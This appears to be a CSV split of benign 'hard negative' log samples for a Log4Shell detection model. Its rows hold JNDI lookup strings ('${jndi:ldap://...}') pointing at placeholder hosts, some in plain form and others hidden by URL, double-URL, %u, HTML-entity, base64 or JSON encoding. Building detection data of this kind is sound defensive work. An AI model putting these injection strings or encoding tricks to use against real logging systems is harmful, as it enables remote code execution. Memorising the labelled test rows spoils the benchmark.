id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-004225,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9rYi5pbnRlcm5hbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0072,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9ryi5pbnrlcm5hbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0072,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004226,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0073,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0073,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004227,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0074","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0074",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004228,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0075,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0075,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004229,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0076,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0076,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004230,2026-05-17,hard_negative,Developer opened Java Naming and Directory Interface documentation trace_id=hardneg-hard_negative_test-0077,developer opened java naming and directory interface documentation trace_id=hardneg-hard_negative_test-0077,0,benign,documentation,mixed,hard_negative_test,low
LS-004231,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0078","info json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0078",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004232,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0079,training note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0079,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004233,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fplaybook.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0080,get /docs/search?q=${jndi:ldap://playbook.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0080,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004234,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0081","info json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0081",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004235,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;docs.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0082,get /preview?html=${jndi:ldap://docs.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0082,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004236,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0083,info markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0083,0,benign,benign_documentation_example,mixed,hard_negative_test,low
LS-004237,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-hard_negative_test-0084,training note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-hard_negative_test-0084,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004238,2026-05-17,hard_negative,Security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-hard_negative_test-0085,security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-hard_negative_test-0085,0,benign,escaped_payload,mixed,hard_negative_test,low
LS-004239,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0086","info json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0086",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004240,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;sample.invalid&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0087,get /preview?html=${jndi:ldap://sample.invalid/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0087,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004241,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://kb.internal/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0088,info escaped_code_sample value='\${jndi:ldap://kb.internal/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0088,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004242,2026-05-17,hard_negative,LDAP connection pool initialized for corporate directory trace_id=hardneg-hard_negative_test-0089,ldap connection pool initialized for corporate directory trace_id=hardneg-hard_negative_test-0089,0,benign,keyword_only,mixed,hard_negative_test,low
LS-004243,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;training.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0090,get /preview?html=${jndi:ldap://training.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0090,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004244,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0091","info json_template={""example"":""\\${jndi:ldap://kb.internal/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0091",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004245,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0092","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0092",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004246,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0093","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0093",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004247,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0094,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0094,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004248,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fdefensive-lab.example%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-hard_negative_test-0095,get /kb/log4shell?sample=${jndi:ldap://defensive-lab.example/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-hard_negative_test-0095,0,benign,benign_encoded_documentation,mixed,hard_negative_test,low
LS-004249,2026-05-17,hard_negative,Blog article about Log4Shell payloads was requested trace_id=hardneg-hard_negative_test-0096,blog article about log4shell payloads was requested trace_id=hardneg-hard_negative_test-0096,0,benign,documentation,mixed,hard_negative_test,low
LS-004250,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0097","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0097",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004251,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'training.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0098,training note tokens '$' '{' 'jndi' ':ldap://' 'training.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0098,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004252,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;defensive-lab.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0099,get /preview?html=${jndi:ldap://defensive-lab.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0099,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004253,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0100,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0100,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004254,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0101","info json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0101",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004255,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;kb.internal&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0102,get /preview?html=${jndi:ldap://kb.internal/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0102,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004256,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://training.local/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0103,info markdown_code_block value='${jndi:ldap://training.local/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0103,0,benign,benign_documentation_example,mixed,hard_negative_test,low
LS-004257,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fplaybook.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0104,get /docs/search?q=${jndi:ldap://playbook.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0104,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004258,2026-05-17,hard_negative,GET /docs/log4j-mitigation HTTP/1.1 trace_id=hardneg-hard_negative_test-0105,get /docs/log4j-mitigation http/1.1 trace_id=hardneg-hard_negative_test-0105,0,benign,documentation,mixed,hard_negative_test,low
LS-004259,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0106,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0106,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004260,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0107,assert literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0107,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004261,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-hard_negative_test-0108,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-hard_negative_test-0108,0,benign,benign_encoded_search_query,mixed,hard_negative_test,low
LS-004262,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0109,info escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0109,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004263,2026-05-17,hard_negative,Blog article about Log4Shell payloads was requested trace_id=hardneg-hard_negative_test-0110,blog article about log4shell payloads was requested trace_id=hardneg-hard_negative_test-0110,0,benign,documentation,mixed,hard_negative_test,low
LS-004264,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://docs.example/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0111","info json_template={""example"":""\\${jndi:ldap://docs.example/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0111",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004265,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0112,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0112,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004266,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'docs.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0113,training note tokens '$' '{' 'jndi' ':ldap://' 'docs.example' are shown separately for awareness trace_id=hardneg-hard_negative_test-0113,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004267,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://docs.example/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0114,info markdown_code_block value='${jndi:ldap://docs.example/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0114,0,benign,benign_documentation_example,mixed,hard_negative_test,low
LS-004268,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0115,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0115,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004269,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0116,security_review indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0116,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004270,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdefensive-lab.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0117,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdefensive-lab.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0117,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004271,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0118,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0118,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004272,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0119","info json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0119",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004273,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0120,training note tokens '$' '{' 'jndi' ':ldap://' 'playbook.local' are shown separately for awareness trace_id=hardneg-hard_negative_test-0120,0,benign,benign_fragmented_tutorial_text,mixed,hard_negative_test,low
LS-004274,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0121,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0121,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004275,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0122","info json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0122",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004276,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0123,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-hard_negative_test-0123,0,benign,benign_documentation_example,mixed,hard_negative_test,low
LS-004277,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0124,security_review indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-hard_negative_test-0124,0,benign,benign_scanner_report,mixed,hard_negative_test,low
LS-004278,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Ftraining.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-hard_negative_test-0125,get /kb/log4shell?sample=${jndi:ldap://training.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-hard_negative_test-0125,0,benign,benign_encoded_documentation,mixed,hard_negative_test,low
LS-004279,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0126,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0126,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004280,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0127","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0127",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004281,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0128","info json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-hard_negative_test-0128",0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004282,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0129,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0129,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004283,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;defensive-lab.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-hard_negative_test-0130,get /preview?html=${jndi:ldap://defensive-lab.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-hard_negative_test-0130,0,benign,benign_html_entity_documentation,mixed,hard_negative_test,low
LS-004284,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0131","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-hard_negative_test-0131",0,benign,benign_keyword_only,mixed,hard_negative_test,low
LS-004285,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0132,assert literal_payload_string equals '${jndi:ldap://kb.internal/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0132,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004286,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://kb.internal/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0133,info escaped_code_sample value='\${jndi:ldap://kb.internal/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0133,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004287,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9kZWZlbnNpdmUtbGFiLmV4YW1wbGUvc2FtcGxlfQ== action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0134,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9kzwzlbnnpdmutbgfilmv4yw1wbguvc2ftcgxlfq== action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0134,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004288,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fplaybook.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-hard_negative_test-0135,get /kb/log4shell?sample=${jndi:ldap://playbook.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-hard_negative_test-0135,0,benign,benign_encoded_documentation,mixed,hard_negative_test,low
LS-004289,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0136,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0136,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004290,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fkb.internal%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0137,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fkb.internal%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0137,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004291,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9wbGF5Ym9vay5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0138,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9wbgf5ym9vay5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-hard_negative_test-0138,0,benign,benign_base64_artifact,mixed,hard_negative_test,low
LS-004292,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0139,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0139,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004293,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fsample.invalid%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-hard_negative_test-0140,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fsample.invalid%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-hard_negative_test-0140,0,benign,benign_percent_u_documentation,mixed,hard_negative_test,low
LS-004294,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0141,assert literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-hard_negative_test-0141,0,benign,benign_unit_test_fixture,mixed,hard_negative_test,low
LS-004295,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0142,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-hard_negative_test-0142,0,benign,benign_json_escaped_payload,mixed,hard_negative_test,low
LS-004296,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Ftraining.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-hard_negative_test-0143,get /kb/log4shell?sample=${jndi:ldap://training.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-hard_negative_test-0143,0,benign,benign_encoded_documentation,mixed,hard_negative_test,low
